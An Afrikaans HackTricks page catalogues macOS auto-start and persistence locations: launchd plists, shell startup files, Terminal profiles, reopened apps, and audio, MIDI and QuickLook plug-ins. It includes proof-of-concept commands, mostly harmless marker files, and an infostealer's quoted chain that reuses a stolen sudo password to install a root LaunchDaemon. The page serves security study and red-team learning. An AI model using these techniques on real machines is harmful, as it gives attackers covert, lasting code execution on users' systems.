# macOS-outomatiese begin

{{#include ../banners/hacktricks-training.md}}

Hierdie afdeling is grootliks gebaseer op die blogreeks [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Die doel is om plekke te identifiseer waar die skryf van ’n lêer later tot kode-uitvoering kan lei, die gebeurtenis wat uitvoering aktiveer, en die vereiste toestemmings. Die teenwoordigheid van ’n plek bewys nie dat die meganisme geaktiveer is nie. Die plaaslike kontroles hieronder is op macOS 26.5.2 (5 Oktober 2026) uitgevoer; dit bevestig nie gedrag op elke macOS-weergawe nie.

> [!NOTE]
> “Skryf-geaktiveer” beteken nie altyd “loop onmiddellik nadat daar geskryf is” nie. Sommige plekke word slegs gelees wanneer ’n gebruiker aanmeld, wanneer ’n spesifieke toepassing begin, of wanneer ’n gebruiker ’n handeling uitvoer. ’n Skryfbare payload binne ’n reeds gekonfigureerde taak is ook iets anders as toestemming om ’n nuwe taak te registreer. Toets dit in ’n weggooibare rekening of VM voordat jy op ’n tegniek staatmaak.

## Sandbox Bypass

> [!TIP]
> Hier kan jy beginplekke vind wat nuttig is vir **sandbox bypass** en jou toelaat om iets eenvoudig uit te voer deur dit **in ’n lêer te skryf** en te **wag** vir ’n baie **algemene** **handeling**, ’n bepaalde **tydperk**, of ’n **handeling wat jy gewoonlik kan uitvoer** vanuit ’n sandbox sonder root-toestemmings.

### Launchd

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Plekke

- **`/Library/LaunchAgents`**
  - **Sneller**: Gebruiker meld aan (of uitdruklike registrasie)
  - Root word vereis
- **`/Library/LaunchDaemons`**
  - **Sneller**: Stelsel begin (of uitdruklike registrasie)
  - Root word vereis
- **`/System/Library/LaunchAgents`**
  - **Sneller**: Gebruiker meld aan; beskermde Apple-stelselplek
- **`/System/Library/LaunchDaemons`**
  - **Sneller**: Stelsel begin; beskermde Apple-stelselplek
- **`~/Library/LaunchAgents`**
  - **Sneller**: Gebruiker meld weer aan

Daar is geen `~/Library/LaunchDaemons`-plek wat deur `launchd` geskandeer word nie. Take per gebruiker hoort in `~/Library/LaunchAgents`; die stelseldemoon-gids is `/Library/LaunchDaemons`. [Apple se gids vir die begin van launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) dokumenteer die geskandeerde plekke.

> [!TIP]
> ’n Interessante feit: **`launchd`** het ’n ingebedde property list in ’n Mach-o-afdeling `__Text.__config` wat ander bekende dienste bevat wat launchd moet begin. Boonop kan hierdie dienste die `RequireSuccess`, `RequireRun` en `RebootOnSuccess` bevat, wat beteken dat hulle uitgevoer moet word en suksesvol moet voltooi.
>
> Natuurlik kan dit nie gewysig word nie weens code signing.

#### Beskrywing en uitbuiting

**`launchd`** is die **eerste** **proses** wat deur die OS-kern uitgevoer word wanneer dit begin, en die laaste een wat tydens afskakeling eindig. Dit behoort altyd **PID 1** te hê. Hierdie proses sal die konfigurasies lees en uitvoer wat in die **ASEP**-**plists** aangedui word in:

- `/Library/LaunchAgents`: Agente per gebruiker wat deur die admin geïnstalleer is
- `/Library/LaunchDaemons`: Stelselwye daemons wat deur die admin geïnstalleer is
- `/System/Library/LaunchAgents`: Agente per gebruiker wat deur Apple verskaf word.
- `/System/Library/LaunchDaemons`: Stelselwye daemons wat deur Apple verskaf word.

Wanneer ’n gebruiker aanmeld, laai `launchd` die plists in daardie gebruiker se `~/Library/LaunchAgents` met daardie gebruiker se toestemmings. Take word volgens hul sleutels begin; die laai van ’n plist beteken nie op sigself dat ’n proses onmiddellik uitgevoer word nie.

Die **hoofverskil tussen agente en daemons is dat agente gelaai word wanneer die gebruiker aanmeld en daemons tydens die stelsel se opstart gelaai word** (want daar is dienste soos ssh wat uitgevoer moet word voordat enige gebruiker toegang tot die stelsel kry). Agente kan ook GUI gebruik, terwyl daemons in die agtergrond moet loop.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Elke `ProgramArguments`-element is ’n afsonderlike argument; `launchd` ontleed nie ’n enkele string as ’n shell-opdrag nie. Die reggestelde voorbeeld hierbo se sintaksis kan nagegaan word sonder om dit te laai, met `plutil -lint /path/to/example.plist`. Sien die plaaslike `man launchd.plist`-inskrywing vir `ProgramArguments`, `RunAtLoad` en `KeepAlive`.

#### Lêergebeurtenis-snellers in bestaande take

’n **Reeds gelaaide** agent of daemon kan `WatchPaths` gebruik om te begin wanneer ’n benoemde pad verander. `QueueDirectories` begin ’n taak terwyl ’n gids nie leeg is nie; `StartOnMount` begin wanneer ’n volume gemonteer word. [Apple se launchd-gids](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) bevat voorbeelde van `WatchPaths` en `QueueDirectories`. ’n Skryfbewerking na ’n lêer wat gemonitor word, aktiveer die **reeds gekonfigureerde taak**; dit gee arbitrêre kode-uitvoering slegs as die skrywer ook beheer het oor die taak se uitvoerbare lêer, script of data wat die taak interpreteer. Om bloot ’n nuwe plist buite ’n geskandeerde of geregistreerde ligging te skryf, laai dit nie.

Hierdie selfopruimende PoC registreer ’n uniek benoemde **tydelike gebruikersagent**, verander net sy eie gemonitorde lêer en verwyder die agent. Dit is suksesvol uitgevoer op macOS 26.5.2 sonder om af te meld of te herbegin:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

Die plaaslike uitvoering het `watch fired: True` gedruk, en `bootout` het geslaag. `launchctl bootstrap` word hier slegs binne die geïsoleerde PoC gebruik; dit is **nie** nodig vir ’n job wat reeds gelaai is nie. Om ’n bestaande job veilig te beoordeel, lees sy plist en die opgeloste `ProgramArguments`-pad, en kyk dan of die betrokke uitvoerbare lêer of geïnterpreteerde lêer skryfbaar is, sonder om dit te wysig.

Daar is gevalle waar ’n **agent uitgevoer moet word voordat die gebruiker aanmeld**; dit word **PreLoginAgents** genoem. Dit is byvoorbeeld nuttig om ondersteunende tegnologie tydens aanmelding beskikbaar te stel. Hulle kan ook in `/Library/LaunchAgents` gevind word (sien [**hier**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) ’n voorbeeld).

> [!TIP]
> Nuwe Daemons- of Agents-konfigurasielêers sal **ná die volgende herlaai of met** `launchctl load <target.plist>` **gelaai word**. Dit is **ook moontlik om .plist-lêers sonder daardie uitbreiding te laai** met `launchctl -F <file>` (daardie plist-lêers sal egter nie outomaties ná herlaai gelaai word nie).\
> Dit is ook moontlik om dit te **ontlaai** met `launchctl unload <target.plist>` (die proses waarna dit verwys, sal beëindig word),
>
> Om **seker te maak** dat daar **niks** (soos ’n oorheersing) is wat ’n **Agent** of **Daemon** **verhoed om** **te loop nie**, voer uit: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Lys al die agents en daemons wat deur die huidige gebruiker gelaai is:

```bash
launchctl list
```

#### Voorbeeld van ’n kwaadwillige LaunchDaemon-ketting (wagwoordhergebruik)

’n Onlangse macOS-infostealer het ’n **vasgevangde sudo-wagwoord** hergebruik om ’n user agent en ’n root LaunchDaemon te installeer:<sup>[[1]](#references)</sup>

- Skryf die agent-lus na `~/.agent` en maak dit uitvoerbaar.
- Genereer ’n plist in `/tmp/starter` wat na daardie agent verwys.
- Hergebruik die gesteelde wagwoord met `sudo -S` om dit na `/Library/LaunchDaemons/com.finder.helper.plist` te kopieer, stel `root:wheel` in en laai dit met `launchctl load`.
- Begin die agent stilweg met `nohup ~/.agent >/dev/null 2>&1 &` om die uitvoer te ontkoppel.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> ’n Daemon-plist wat in `/Library/LaunchDaemons` geplaas word, word nie veilig deur dit aan ’n gebruiker toe te wys nie. `launchd` vereis toepaslike eienaarskap en toestemmings vir stelsel take en kan ’n onveilige plist verwerp. ’n Daemon wat deur root besit word, loop normaalweg as root, tensy sy konfigurasie ’n ander rekening kies. Gaan die taak se `UserName`, `GroupName`, eienaarskap en `launchctl`-diagnostiek na; moenie die uitvoeringsidentiteit bloot uit die naam van die plist se eienaar aflei nie.

#### Meer inligting oor launchd

**`launchd`** is die **eerste** gebruikersmodusproses wat vanaf die **kernel** begin word. Die proses moet **suksesvol** begin en **kan nie afsluit of omval nie**. Dit word selfs teen sommige **seine om dit te beëindig** beskerm.

Een van die eerste dinge wat `launchd` sou doen, is om al die **daemons** te **begin**, soos:

- **Tyddaemons** wat op grond van die tyd waarop hulle uitgevoer moet word, werk:
  - `com.apple.atrun.plist` roep `/usr/libexec/atrun` aan met `StartInterval = 30` sekondes in macOS 26.5.2; die effektiewe geaktiveerde toestand kan verskil van die plist se `Disabled`-sleutel, omdat launchd afsonderlik oorrides stoor.
  - `com.vix.cron.plist` roep `/usr/sbin/cron` aan wanneer `/usr/lib/cron/tabs` take bevat. `com.apple.systemstats.daily` is ’n ander geskeduleerde diens, nie die cron-daemon nie.
- **Netwerkdaemons** soos:
  - `org.cups.cups-lpd`: Luister op TCP (`SockType: stream`) met `SockServiceName: printer`
    - SockServiceName moet óf ’n poort óf ’n diens uit `/etc/services` wees
  - `com.apple.xscertd.plist`: Luister op TCP-poort 1640
- **Pad-daemons** wat uitgevoer word wanneer ’n gespesifiseerde pad verander:
  - `com.apple.postfix.master`: Kontroleer die pad `/etc/postfix/aliases`
- **IOKit-kennisgewingdaemons**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach-poort:**
  - `com.apple.xscertd-helper.plist`: Die `MachServices`-inskrywing dui die naam `com.apple.xscertd.helper` aan
- **UserEventAgent:**
  - Dit verskil van die vorige een. Dit laat launchd programme begin in reaksie op ’n spesifieke gebeurtenis. In hierdie geval is die hoofbinêre lêer egter nie `launchd` nie, maar `/usr/libexec/UserEventAgent`. Dit laai plugins uit die SIP-beperkte vouer /System/Library/UserEventPlugins/, waar elke plugin sy initialiser in die `XPCEventModuleInitializer`-sleutel aandui, of, in die geval van ouer plugins, in die `CFPluginFactories`-woordeboek onder die sleutel `FB86416D-6164-2070-726F-70735C216EC0` van sy `Info.plist`.

### dop-opstartlêers

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
  - Maar jy moet ’n app vind met ’n TCC-bypass wat ’n shell uitvoer wat hierdie lêers laai

#### Ligging

- **`~/.zshenv`** (of ’n nuwer, saamgestelde **`~/.zshenv.zwc`**)
  - **Sneller**: Enige gewone zsh-aanroep, insluitend ’n nie-interaktiewe `zsh -c`; `zsh -f` slaan gebruiker-opstartlêers oor.
- **`~/.zshrc`**
  - **Sneller**: Interaktiewe zsh begin.
- **`~/.zprofile`, `~/.zlogin`**
  - **Sneller**: Login-zsh begin; hierdie lêers word onderskeidelik voor en ná `.zshrc` gelees.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Sneller**: Maak ’n terminaal met zsh oop
  - Root word vereis
- **`~/.zlogout`**
  - **Sneller**: ’n Login-zsh sluit normaal af, nie elke terminaal- of shell-afsluiting nie.
- **`/etc/zlogout`**
  - **Sneller**: Sluit ’n terminaal met zsh af
  - Root word vereis
- Moontlik meer in: **`man zsh`**
- **`~/.bashrc`**
  - **Sneller**: Begin interaktiewe **nie-login** Bash. ’n Interaktiewe login-Bash lees dit slegs as ’n login-lêer dit uitdruklik laai.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Sneller**: Begin login-Bash; die eerste leesbare lêer in daardie volgorde word uitgevoer. `~/.profile` word oorgeslaan as een van die vorige lêers bestaan.
- **`/etc/profile`**
  - **Sneller**: Begin login-Bash; root is nodig om dit te verander.
- **`~/.tcshrc`** of, indien dit ontbreek, **`~/.cshrc`**
  - **Sneller**: Begin `tcsh`, insluitend ’n nie-interaktiewe `tcsh -c` op hierdie Mac. Die gebruiker moet werklik `tcsh` aanroep; dit is nie die verstek macOS-shell nie.
- **`~/.login`**
  - **Sneller**: Begin ’n login-`tcsh` ná sy rc-lêer.
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Sneller**: Sou na verwagting met xterm aktiveer, maar dit **is nie geïnstalleer nie**, en selfs ná installering word hierdie fout gewys: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Beskrywing & Uitbuiting

Wanneer ’n shell-omgewing soos `zsh` of `bash` begin word, **word sekere opstartlêers uitgevoer**. macOS gebruik tans `/bin/zsh` as die verstek-shell. Of Terminal of SSH ’n login- of interaktiewe shell begin, hang van hul konfigurasie af; moenie aanvaar dat elke lêer hierbo in elke sessie uitgevoer word nie. Hoewel `bash` en `sh` ook in macOS beskikbaar is, moet hulle uitdruklik aangeroep word om gebruik te word.<sup>[[2]](#references)</sup> Die [zsh-opstartlêerverwysing](https://zsh.sourceforge.io/Doc/Release/Files.html) spesifiseer die volgorde, die `ZDOTDIR`-oorheersing en die `.zwc`-reël.

Die volgende leesalleen-eksperiment het ’n weggooibare `ZDOTDIR` op macOS 26.5.2 gebruik. Dit wys watter gebruikerslêers gelees is; geen werklike shell-opstartlêer is verander nie:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

Die waargenome volgorde was `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`. `ZDOTDIR` moet reeds na die alternatiewe gids wys; dit is nie genoeg om bloot lêers in ’n arbitrêre gids te skryf nie.

[Bash se opstartverwysing](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) onderskei tussen login- en interaktiewe shells. Op die macOS 26.5.2-toetsmasjien het ’n geïsoleerde `HOME` met al vier gebruikeropstartlêers die volgende opgelewer: `bash -c` → geen, `bash -ic` → `.bashrc`, `bash -lc` en `bash -lic` → slegs `.bash_profile`. Nadat `.bash_profile` verwyder is, het login Bash `.bash_login` gelees, en daarna `.profile` toe dié ook verwyder is. `BASH_ENV` kan nie-interaktiewe Bash na ’n lêer wys, maar daardie omgewingsveranderlike moet reeds in die aanroepproses gestel wees. ’n Eksplisiete `exit` uit ’n login Bash kan ook `~/.bash_logout` laai.

Die plaaslike `tcsh(1)`-handleiding beskryf sy afsonderlike opstartvolgorde. Met ’n weggooibare `HOME` het `/bin/tcsh -c :` `.tcshrc` gelees, of `.cshrc` as `.tcshrc` nie bestaan het nie. ’n Weggooibare login `tcsh` het `.tcshrc` en `.login` gelees. Hierdie kontroles het slegs tydelike lêers geskep en verwyder.

### Heropende toepassings

> [!CAUTION]
> Die aangeduide uitbuiting opstel en dan uit- en weer aanmeld, of selfs herlaai, het nie die toepassing tydens toetsing uitgevoer nie. Die toepassing moet moontlik loop wanneer hierdie handelinge uitgevoer word.

**Skrywe**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Sneller**: Herbegin om toepassings te heropen

#### Beskrywing en uitbuiting

Al die toepassings wat heropen moet word, is in die plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Om die heropen-toepassings jou eie toepassing te laat begin, hoef jy net **jou toepassing by die lys te voeg**.

Die UUID kan gevind word deur daardie gids te lys of met `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Om te kontroleer watter toepassings heropen sal word, kan jy die volgende uitvoer:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

Om **'n toepassing by hierdie lys te voeg**, kan jy gebruik:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Terminal-voorkeure

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC-bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal gebruik om FDA-toestemmings van die gebruiker te hê

#### Ligging

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Sneller**: Maak ’n nuwe Terminal-venster of -oortjie oop met die profiel waarvan die Shell-instellings die opstartopdrag bevat

#### Beskrywing en uitbuiting

In **`~/Library/Preferences`** word die gebruiker se voorkeure vir toepassings gestoor. Sommige van hierdie voorkeure kan ’n konfigurasie bevat om **ander toepassings/skripte uit te voer**.<sup>[[5]](#references)</sup>

Terminal kan byvoorbeeld ’n opdrag tydens opstart uitvoer:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Hierdie konfigurasie word soos volg in die lêer **`~/Library/Preferences/com.apple.Terminal.plist`** weerspieël:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

As die relevante profiel ’n opstartopdrag bevat en Terminal daardie voorkeur lees, kan ’n nuwe sessie wat daardie profiel gebruik dit uitvoer. [Apple se huidige Terminal-gids](https://support.apple.com/guide/terminal/trmlshll/mac) dokumenteer die per-profiel **Shell → Startup**-opdrag. Dit is nie genoeg om Terminal bloot oop te maak sonder ’n nuwe sessie wat daardie profiel gebruik nie. Die voorkeure hieronder is **nie** op die navorsings-Mac gewysig nie.

Jy kan dit vanaf die cli byvoeg met:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Terminal Scripts / Ander lêeruitbreidings

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC-omseiling: [✅](https://emojipedia.org/check-mark-button)
  - Terminal word gebruik om FDA-toestemmings van die gebruiker te hê wat dit gebruik

#### Ligging

- **Enige plek**
  - **Sneller**: Maak die spesifieke `.terminal`-, `.command`- of `.tool`-lêer oop

#### Beskrywing en uitbuiting

As ’n gebruiker ’n **`.terminal`**-instellingslêer oopmaak, kan Terminal ’n sessie vanaf sy profiel skep; uitvoerbare **`.command`**- en **`.tool`**-lêers kan ook in Terminal oopmaak. Dit is ’n eksplisiete lêeropensneller, nie uitvoering bloot deur Terminal oop te maak nie. Enige oorgeërfde TCC-toegang hang af van Terminal se werklike toestemmings en die handeling wat probeer word. Die historiese voorbeeld hieronder is nie op die navorsings-Mac uitgevoer nie.

Probeer dit met:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

Jy kan ook die uitbreidings **`.command`**, **`.tool`** gebruik, met gewone shell scripts-inhoud; hulle sal ook deur Terminal oopgemaak word.

> [!CAUTION]
> As Terminal **Full Disk Access** het, sal dit daardie aksie kan voltooi (let daarop dat die uitgevoerde command in ’n Terminal-venster sigbaar sal wees).

### Audio-inproppe

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC-bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Jy kry dalk ekstra TCC-toegang

#### Ligging

- **`/Library/Audio/Plug-Ins/HAL`**
  - Root word vereis
  - **Sneller**: Die Core Audio-bediener laai ’n versoenbare HAL-toestel-inprop; ’n bedienerherbegin kan ’n nuwe ontdekking veroorsaak
- **`/Library/Audio/Plug-ins/Components`**
  - Root word vereis
  - **Sneller**: ’n Oudio-gasheer ontdek en instansieer die geïnstalleerde Audio Unit
- **`~/Library/Audio/Plug-ins/Components`**
  - **Sneller**: ’n Oudio-gasheer ontdek en instansieer die geïnstalleerde Audio Unit
- **`/System/Library/Components`**
  - Apple-verskafde, stelselbeskermde ligging
  - **Sneller**: ’n Oudio-gasheer instansieer ’n ooreenstemmende stelselkomponent

#### Beskrywing

Volgens die vorige writeups is dit moontlik om **sommige audio-inproppe te compileer** en hulle te laat laai.<sup>[[6]](#references)[[7]](#references)</sup>

HAL-toestel-inproppe en Audio Units is afsonderlike laaipaaie. [Apple se gids vir Audio Unit-hosting](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) sê dat ’n gasheer ’n komponent moet vind en instansieer; om een na ’n skandeergids te kopieer of `coreaudiod` te herbegin, bewys nie op sigself dat dit uitgevoer word nie. AUv2-inproppe loop in die gasheerproses, terwyl [Apple se huidige Audio Unit-riglyne](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) sê dat AUv3 by verstek in ’n afsonderlike proses op macOS loop. Die handtekening-, sandbox- en library-validation-beperkings hang van die gasheer af. Geen audio-inprop is op die navorsings-Mac geïnstalleer of uitgevoer nie.

### CoreMIDI Drivers (MIDIServer)

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Jou code loop binne die `MIDIServer`-proses, nie jou app se sandbox nie
- TCC-bypass: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` loop onder sy eie `seatbelt`-sandboxprofiel

#### Ligging

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Root word nie vereis nie (skryfbaar deur die gebruiker)
  - **Sneller**: `MIDIServer` begin (weer). Dit word op aanvraag geloods wanneer enige proses CoreMIDI vir die eerste keer gebruik (deur *Audio MIDI Setup*, GarageBand, ’n DAW of ’n bladsy wat WebMIDI gebruik, oop te maak)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Root word vereis
  - **Sneller**: dieselfde as hierbo

#### Beskrywing en uitbuiting

Apple se `MIDIServer` (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`) laai MIDI-**driver**-bundels uit die `Audio/MIDI Drivers`-gidse. Die binary is deur Apple onderteken, maar kom met die `com.apple.security.cs.disable-library-validation`-entitlement, sodat dit ’n bundel sal laai wat **ongonderteken is of ad hoc deur ’n ander span onderteken is**. Dit lewer code execution binne ’n afsonderlike, Apple-besitte proses **sonder root** op.<sup>[[53]](#references)</sup>

Geverifieer op macOS 26 (slegs-lees):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

'n Driver is 'n standaard bundel wat 'n `MIDIDriverInterface`-factory uitvoer; plaas die payload in die factory/constructor sodat dit loop sodra `MIDIServer` die drivers lys. Bou dit, plaas dit as `~/Library/Audio/MIDI Drivers/Evil.plugin` en aktiveer 'n laai sonder om af te meld of te herlaai:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### QuickLook-inproppe

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
- TCC-omseiling: [🟠](https://emojipedia.org/large-orange-circle)
  - Jy kan dalk ekstra TCC-toegang kry

#### Ligging

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Beskrywing & Uitbuiting

QuickLook-inproppe kan uitgevoer word wanneer jy **die voorskou van ’n lêer aktiveer** (druk die spasiebalk terwyl die lêer in Finder gekies is) en ’n **inprop wat daardie lêertipe ondersteun** geïnstalleer is.<sup>[[8]](#references)</sup>

Dit is moontlik om jou eie QuickLook-inprop te kompileer, dit op een van die vorige liggings te plaas om dit te laai, en dan na ’n lêer van ’n ondersteunde tipe te gaan en die spasiebalk te druk om dit te aktiveer.

Hierdie paaie verwys na verouderde `.qlgenerator`-bundels; [Apple se argitektuurgids vir Quick Look](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) beskryf die soekvolgorde en ooreenstemmende lêertipes. Huidige Quick Look-**app-uitbreidings** word saam met ’n app verpak en het ander registrasie- en uitvoeringsreëls. Die teenwoordigheid van ’n generator bewys nie dat dit vir die tipekeuse gekies word of dat die kode daarvan in Finder self loop nie. Die verouderde generatorpad is nagegaan aan die hand van dokumentasie en die teenwoordigheid van gidse; geen generator is op die navorsings-Mac geïnstalleer of gelaai nie.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Dit het nie vir my gewerk nie, nóg met die gebruiker se LoginHook nóg met die root LogoutHook

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
